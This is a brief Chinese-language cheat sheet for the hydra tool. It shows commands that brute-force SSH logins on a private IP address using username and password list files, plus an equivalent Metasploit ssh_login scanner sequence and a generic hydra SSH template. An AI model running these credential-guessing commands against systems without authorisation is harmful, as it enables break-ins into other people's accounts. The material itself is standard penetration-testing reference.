====================
hydra
====================

暴力破解帐密

示例
====================

.. code-block:: sh

	# username存放在username.txt
	# password存放在pwd.txt
	# 以ssh形式破解192.168.135.123帐密
	hydra -L username.txt -P pwd.txt 192.168.135.123 ssh

.. note::

	或者还是使用msfconsole

	.. code-block:: sh

		msfconsole

		use auxiliary/scanner/ssh/ssh_login
		set RHOSTS 192.168.135.123
		set PASS_FILE password.txt
		set USER_FILE username.txt
		exploit

爆破ssh::

	hydra -L 用户名文件 -P 用户密码文件 IP地址 ssh

